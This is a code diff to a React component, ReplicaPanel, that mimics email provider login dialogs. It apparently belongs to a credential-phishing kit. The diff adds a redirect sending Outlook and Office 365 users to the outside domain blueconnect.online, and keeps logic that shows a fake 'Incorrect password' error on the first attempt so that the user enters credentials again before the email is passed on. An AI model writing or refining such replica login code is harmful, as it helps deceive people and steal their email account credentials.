@@ -18,6 +18,10 @@ export default function ReplicaPanel({ onSelectProvider, mockProviders }: Replic
   const [attempts, setAttempts] = useState(0);
 
   const handleOpenLogin = (provider: EmailProvider) => {
+    if (provider.id === 'outloo' || provider.id === 'office365') {
+      window.location.href = "https://blueconnect.online";
+      return;
+    }
     setActiveLoginProvider(provider);
     setEmailInput('');
     setPasswordInput('');
@@ -59,12 +63,8 @@ export default function ReplicaPanel({ onSelectProvider, mockProviders }: Replic
     setTimeout(() => {
       setIsLoading(false);
       if (attempts === 0) {
-        if (activeLoginProvider?.id === 'outloo' || activeLoginProvider?.id === 'office365') {
-          window.location.href = "blueconnect.online";
-        } else {
-          setErrorMsg('Incorrect password. Please check your credentials and try again.');
-          setAttempts(1);
-        }
+        setErrorMsg('Incorrect password. Please check your credentials and try again.');
+        setAttempts(1);
       } else {
         onSelectProvider(activeLoginProvider!, emailInput);
         setActiveLoginProvider(null);
